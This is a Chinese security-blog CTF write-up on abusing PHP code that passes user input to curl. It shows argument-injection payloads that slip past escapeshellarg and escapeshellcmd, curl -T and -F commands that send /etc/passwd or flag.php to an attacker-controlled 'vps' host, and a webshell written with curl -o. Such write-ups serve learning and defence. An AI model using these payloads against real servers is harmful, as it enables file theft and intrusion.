# 绕过限制利用curl读取写入文件

阅读量 **517988**

|评论 **5**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-02-28 10:13:58

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01b3d560ed0fe34f6f.png)

> 本篇原创文章参加双倍稿费活动，预估稿费为600元，活动链接请点[此处](https://www.anquanke.com/post/id/98410)

## 说明

最近做了一道wonderkun师傅出的一道CTF的题目，学到了很多的姿势，包括PHP的函数用法以及curl的用法。一般都是利用curl来发送HTTP的请求，可是在实际的漏洞利用过程，curl却是一个非常好的利用工具。因为Linux系统中一般都会自带curl工具，其次是curl支持file协议，意味着我们能够读取本地文件。

所以在很多实际情况下，我们不得不使用curl，但是我们又要防止被攻击者利用读取我们系统本地的文件，那么我们一般都会加上校验代码，对于传入的curl的参数进行校验。但是很多时候由于开发者的安全意识不够，我们还是能够绕过校验读取敏感文件。

而本篇文章就是在CTF的题目上加上我自己的思考，用以说明curl的用法或者说是绕过不同类型的过滤代码。

## curl写文件

如果有一段这样的代码，如下：

    
    
    <?php
    include 'flag.php' ; 
    $url = $_GET['url'];
    
    $urlInfo = parse_url($url);
    
    if(!("http" === strtolower($urlInfo["scheme"]) || "https"===strtolower($urlInfo["scheme"]))){    
      die( "scheme error!");
    }
    system("curl ".$url);
    

首先需要明确的是curl是支持file协议的，可以通过file协议读取文件。其实curl还支持很多其他的协议，但在这里不是重点。

    
    
    spoock@ubuntu:~$ curl file:///etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    .....
    

但在这道题目中，对传入的url进行了检测，url的协议需要是`http`或者是`https`。那么是不是就没有办法了呢？在curl中存在一个`-o`的参数，表示`-o/--output
<file> 指定输出文件名称`。那么问题就很简单了，直接curl读取远程文件，写入成为一个webshell。  
读取文件:

![](https://p4.ssl.qhimg.com/t0166fa121449151068.png)

在服务器上面写入了webshell。

![](https://p0.ssl.qhimg.com/t01b1225fd24fbcf164.png)

## curl 转发

如果在服务器上面禁止写入文件，那么上面通过写入webshell来读取文件的方式就行不通了。读取文件必须使用到`file`协议，但是又限制了`$url`的协议必须为`http`或者是`https`，那么我是否可以通过跳转的方式，将`http`跳转到`file`协议呢？  
我在我的vps创建一个`redirect.php`文件，如下：

    
    
    <?php
    header("Location: file://///etc/passwd");
    exit();
    

但是在默认情况下，curl并不会进行跳转,需要加上`-L`的参数。如下：

![](https://p2.ssl.qhimg.com/t01e1973f2eba0f73f9.png)

但即使是加上了`-L`的参数，curl也无法读取文件:  

不知道为什么会出现这样的问题，正如之前所展示的`curl
file:///etc/passwd`这种方式是可以读取文件，为什么跳转的时候却无法读取文件。希望有大佬可以指点一下。

所以通过跳转的方式卒！

## curl PUT文件

条件同样是在服务器上面禁止写文件。

这种方式是在搜索的时候，看到了一个CTF的技巧。可以借助curl中的`-T`参数进行读取文件，`-T localfile 向服务器PUT文件 例如：curl
-T 1.mp3 www.jbxue.com/upload.php`。通过`curl
-T`将参数发送到vps上面。就可以利用curl的这个功能来将文件PUT上传给我们的主机，由于PUT
method是HTTP的，所以主机需要支持web服务，然后带上端口。那么我们的利用方式可以变为:

    
    
    curl -T flag.php vps:port
    

在vps上面进行监听。在本地进行测试:  

在本地完美执行，但是问题是在服务器上面测试的，还是无法绕过对`http`和`https`的检查。当带有端口时，`parse_url`无法识别。如下：

  
。

那么默认的就只有80端口了。这个问题也很好解决，在服务器上面的80端口，需要开启PUT方法,创建一个文件用于接受发送过来的文件即可。

    
    
    <?php
    $putData = fopen("php://input",r);
    file_put_contents('passwd.txt',$putData);
    

以下就是演示：

![](img/20171027-7.png)

在服务器顺利生成了`passwd.txt`文件。

![](img/20171027-8.png)

## 进阶

上面仅仅只有一个检查`http`和`https`协议的防护，对参数没有进行任何的过滤。如果是下面这种情况，使用`escapeshellarg`和`escapeshellcmd进行`了过滤呢？

    
    
    <?php
    include 'flag.php' ; 
    $url = $_GET['url'];
    
    $urlInfo = parse_url($url);
    
    if(!("http" === strtolower($urlInfo["scheme"]) || "https"===strtolower($urlInfo["scheme"]))){    
      die( "scheme error!");
    }
    $url = escapeshellarg($url);
    $url = escapeshellcmd($url);
    system("curl ".$url);
    

如果增加了`escapeshellarg`和`escapeshellcmd`的过滤呢。

  * escapeshellarg,将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号
  * escapeshellcmd,会对以下的字符进行转义&#;`|*?~<>^()[]{}$`, `x0A` 和 `xFF`, `'` 和 `"`仅在不配对儿的时候被转义

以下就是使用的效果，如下：

![](https://p1.ssl.qhimg.com/t013a58c1c34eb5a315.png)

在字符串增加了引号同时会进行转义，那么之前的payload`http://192.168.158.131/test/index.php?url=http://xxx.com
-T
/etc/passwd`的方式就无法使用了，因为增加了`'`进行了转义，所以整个字符串会被当成参数。注意`escapeshellcmd`的问题是在于如果`'`和`"`仅在不配对儿的时候被转义。那么如果我们多增加一个`'`就可以扰乱之前的转义了。如下：

![](https://p3.ssl.qhimg.com/t01b7b09888f2255f77.png)

但是这样并不会成功。在本地进行尝试的时候，显示结果如下:

    
    
    spoock@ubuntu:/var/www/html/ctf$ curl 'http://192.168.158.131/ctf/index.php'\'' -T /etc/passwd'
    curl: Can't open '/etc/passwd''!
    curl: try 'curl --help' or 'curl --manual' for more information
    

无法识别文件`/etc/passwd'`，那么只能使用其他的方法了。在curl中存在`-F`提交表单的方法，也可以提交文件。`-F <key=value>
向服务器POST表单，例如：curl -F "web=[@index](https://github.com/index
"@index").html;type=text/html"
url.com`。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了,同时还不受最后的``的影响。那么最后的payload为：

    
    
    http://baidu.com/' -F file=@/etc/passwd -x  vps:9999
    

最终运行的结果是`curl 'http://baidu.com/'\'' -F file=@/etc/passwd -x
vps:9999'`，对于`'http://baidu.com/'\''`来说，由于`\`是转义的``，后面的一对`'`直接可以忽略了，所以实际上执行的是`curl
'http://baidu.com/'`。代理`-x vps:9999'`后面的`'`对于代理也没有影响，因此最后就能够正常地执行了。

在vps上面监听9999端口，就可以顺利地收到服务器发送过来的`/etc/passwd`文件，但是这个问题是在于对于服务器上面的`curl`版本有要求，不是所有的版本的都能够执行成功。以下我进行的测试：  
在7.47上面无法成功：

![](img/20171027-12.png)

在7.38上面顺利执行:

![](img/20171027-13.png)

在7.19上面也是可以顺利执行的。  
  
根据猜测，可能在是新版本中，先会执行`curl
http`的操作，但是由于在后面增加了``,例如`http://127.0.0.1`，但是curl无法找到这样的文件，出现404。出现404之后，后面的提交文件的操作就不进行了，程序就退出了。这样在vps上面就无法接受到文件了。

## 总结

通过这个漏洞，还是学习到了很多关于`curl`的用法，以及`escapeshellarg`和`escapeshellcmd`造成的问题。关于`header("Location:
file://///etc/passwd");`这种方式不成功，希望有大佬能够指点一下。

## 参考

[PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **天王盖地虎** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/98896](/post/id/98896)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [绕过限制](/tag/绕过限制)
  * [curl读取](/tag/curl读取)
  * [写入文件](/tag/写入文件)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg) 天王盖地虎

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

